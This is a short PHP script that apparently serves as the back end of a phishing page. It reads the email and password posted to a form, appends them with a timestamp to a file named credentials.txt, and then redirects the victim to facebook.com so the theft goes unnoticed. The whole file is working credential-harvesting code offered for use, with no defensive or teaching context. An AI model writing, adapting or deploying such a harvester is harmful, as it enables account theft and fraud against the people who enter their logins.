<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Format the data to save
    $data = "Email: " . $email . " | Password: " . $password . " | Date: " . date("Y-m-d H:i:s") . "\n";

    // Save to a text file (Ensure your server has write permissions)
    $file = fopen("credentials.txt", "a");
    fwrite($file, $data);
    fclose($file);

    // Redirect the user back or to a fake error page
    header("Location: https://facebook.com");
    exit();
}
?>
